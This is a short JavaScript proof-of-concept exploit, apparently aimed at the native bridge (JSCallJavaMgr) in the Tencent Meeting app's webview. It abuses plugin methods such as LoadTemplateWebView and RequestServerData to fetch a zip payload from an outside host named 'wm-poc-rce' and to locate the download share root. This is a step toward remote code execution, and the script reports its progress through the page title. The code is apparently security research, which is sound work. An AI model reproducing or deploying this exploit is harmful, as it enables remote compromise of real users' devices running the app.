(function(){
  document.title='P89TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P89CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P89TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P89TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p89',process_pattern:1}],
    ['T2','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p89b',process_pattern:0}],
    ['R1','CommonPlugin','RequestServerData',{url:zip}],
    ['G2','CommonPlugin','GetWebDownloadShareRoot',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P89TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P89-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
